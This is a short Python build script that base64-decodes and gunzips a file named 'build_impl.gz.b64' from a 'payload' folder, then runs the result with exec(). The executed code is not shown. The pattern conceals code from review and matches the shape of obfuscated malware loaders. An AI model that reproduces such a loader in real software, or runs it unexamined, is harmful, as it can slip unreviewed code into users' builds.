import base64, gzip
from pathlib import Path

payload = Path(__file__).parent / "source" / "payload" / "build_impl.gz.b64"
code = gzip.decompress(base64.b64decode(payload.read_text().strip()))
exec(compile(code, "build_impl.py", "exec"))
